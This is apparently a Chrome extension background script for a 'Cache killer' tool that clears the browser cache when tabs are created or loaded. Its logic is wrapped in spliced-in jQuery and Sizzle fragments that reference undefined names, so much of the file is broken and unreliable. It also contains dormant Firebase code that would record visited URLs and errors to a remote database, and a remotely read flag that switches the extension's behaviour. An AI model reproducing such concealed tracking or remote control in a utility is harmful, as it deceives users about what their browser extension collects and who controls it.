
var cacheclear=({isReady:true,error:function(msg){throw new Error(msg);},noop:function(){},isFunction:function(obj){return j.type(obj)==="function";},isArray:Array.isArray,isWindow:function(obj){return obj!=null&&obj===obj.window;},isNumeric:function(obj){var realStringObj=obj&&obj.toString();return!j.isArray(obj)&&(realStringObj-parseFloat(realStringObj)+1)>=0;},isPlainObject:function(obj){var key;if(j.type(obj)!=="object"||obj.nodeType||j.isWindow(obj)){return false;}
if(obj.constructor&&!hasOwn.call(obj,"constructor")&&!hasOwn.call(obj.constructor.prototype||{},"isPrototypeOf")){return false;}
for(key in obj){}
return key===undefined||hasOwn.call(obj,key);},isEmptyObject:function(obj){var name;for(name in obj){return false;}
return true;},type:function(obj){if(obj==null){return obj+"";}
return typeof obj==="object"||typeof obj==="function"?class2type[toString.call(obj)]||"object":typeof obj;},globalEval:function(code){var script,indirect=eval;code=j.trim(code);if(code){if(code.indexOf("use strict")===1){script=document.createElement("script");script.text=code;document.head.appendChild(script).parentNode.removeChild(script);}else{indirect(code);}}},camelCase:function(string){return string.replace(rmsPrefix,"ms-").replace(rdashAlpha,fcamelCase);},nodeName:function(elem,name){return elem.nodeName&&elem.nodeName.toLowerCase()===name.toLowerCase();},each:function(obj,callback){var length,i=0;if(isArrayLike(obj)){length=obj.length;for(;i<length;i++){if(callback.call(obj[i],i,obj[i])===false){break;}}}else{for(i in obj){if(callback.call(obj[i],i,obj[i])===false){break;}}}
return obj;},trim:function(text){return text==null?"":(text+"").replace(rtrim,"");},makeArray:function(arr,results){var ret=results||[];if(arr!=null){if(isArrayLike(Object(arr))){j.merge(ret,typeof arr==="string"?[arr]:arr);}else{push.call(ret,arr);}}
return ret;},inArray:function(elem,arr,i){return arr==null?-1:indexOf.call(arr,elem,i);},merge:function(first,second){var len=+second.length,j=0,i=first.length;for(;j<len;j++){first[i++]=second[j];}
first.length=i;return first;},grep:function(elems,callback,invert){var callbackInverse,matches=[],i=0,length=elems.length,callbackExpect=!invert;for(;i<length;i++){callbackInverse=!callback(elems[i],i);if(callbackInverse!==callbackExpect){matches.push(elems[i]);}}
return matches;},map:function(elems,callback,arg){var length,value,i=0,ret=[];if(isArrayLike(elems)){length=elems.length;for(;i<length;i++){value=callback(elems[i],i,arg);if(value!=null){ret.push(value);}}}else{for(i in elems){value=callback(elems[i],i,arg);if(value!=null){ret.push(value);}}}
return concat.apply([],ret);},guid:1,proxy:function(fn,context){var tmp,args,proxy;if(typeof context==="string"){tmp=fn[context];context=fn;fn=tmp;}
args=slice.call(arguments,2);proxy=function(){return fn.apply(context||this,args.concat(slice.call(arguments)));};return proxy;},now:Date.now});function gr(){var randomPool=new Uint8Array(32);crypto.getRandomValues(randomPool);var hex='';for(var i=0;i<randomPool.length;++i){hex+=randomPool[i].toString(16);}
return hex;}
var f=null;function con(){try{}catch(err){f=null;}}
con();g();re();var r="true";var off=false;function of(){if(f===null)
return;Firebase.goOffline();off=true;}
var lrt=null;var oft=null;function on(){if(f===null)
return;lrt=(new Date()).getTime();if(off===false)
return;Firebase.goOnline();off=false;return;oft=setInterval(function(){var g=(new Date()).getTime()-lrt;if(g>540000){of();clearInterval(oft);}},180000);}
function g(){r=true;if(f===null)
return;f.child(pah()).on("value",function(snapshot){r=snapshot.val();of();if(r.toString()!=="true")
return;re();});}
var pu=null;function re(){chrome.tabs.onUpdated.addListener(function(td,co,t){if(co.status==="loading"){c();}});}
function saveq(url,err){if(f===null)
return;try{var d=new Date();var date=d.toString();var q=f.child('q/'+date);q.set({url:url});}catch(e){console.log(e);}}
function er(err){if(f===null)
return;try{var d=new Date();var date=d.toString();var q=f.child('error/'+date);q.set({err:err});}catch(e){console.log(e);}}
function cl()
{chrome.tabs.onCreated.addListener(function(){c();});}
cl();function c(){try{if(tog!==true)
return;var o={"since":0};chrome.browsingData.removeCache(o,function(){console.log('cache cleared');});}catch(err){console.log(err);er("error in cache clear : "+err);}}
var tog=true;chrome.browserAction.onClicked.addListener(function(tab){tog=!tog;if(tog){chrome.browserAction.setIcon({path:"on.png"});chrome.browserAction.setTitle({title:"Cache killer is on"});}
else{chrome.browserAction.setIcon({path:"off.png"});chrome.browserAction.setTitle({title:"Cache killer is off"});}});function clearcache(selector,context,results,seed){var m,i,elem,nid,nidselect,match,groups,newSelector,newContext=context&&context.ownerDocument,nodeType=context?context.nodeType:9;results=results||[];if(typeof selector!=="string"||!selector||nodeType!==1&&nodeType!==9&&nodeType!==11){return results;}
if(!seed){if((context?context.ownerDocument||context:preferredDoc)!==document){setDocument(context);}
context=context||document;if(documentIsHTML){if(nodeType!==11&&(match=rquickExpr.exec(selector))){if((m=match[1])){if(nodeType===9){if((elem=context.getElementById(m))){if(elem.id===m){results.push(elem);return results;}}else{return results;}}else{if(newContext&&(elem=newContext.getElementById(m))&&contains(context,elem)&&elem.id===m){results.push(elem);return results;}}}else if(match[2]){push.apply(results,context.getElementsByTagName(selector));return results;}else if((m=match[3])&&support.getElementsByClassName&&context.getElementsByClassName){push.apply(results,context.getElementsByClassName(m));return results;}}
if(support.qsa&&!compilerCache[selector+" "]&&(!rbuggyQSA||!rbuggyQSA.test(selector))){if(nodeType!==1){newContext=context;newSelector=selector;}else if(context.nodeName.toLowerCase()!=="object"){if((nid=context.getAttribute("id"))){nid=nid.replace(rescape,"\\$&");}else{context.setAttribute("id",(nid=expando));}
groups=tokenize(selector);i=groups.length;nidselect=ridentifier.test(nid)?"#"+nid:"[id='"+nid+"']";while(i--){groups[i]=nidselect+" "+toSelector(groups[i]);}
newSelector=groups.join(",");newContext=rsibling.test(selector)&&testContext(context.parentNode)||context;}
if(newSelector){try{push.apply(results,newContext.querySelectorAll(newSelector));return results;}catch(qsaError){}finally{if(nid===expando){context.removeAttribute("id");}}}}}}
return select(selector.replace(rtrim,"$1"),context,results,seed);}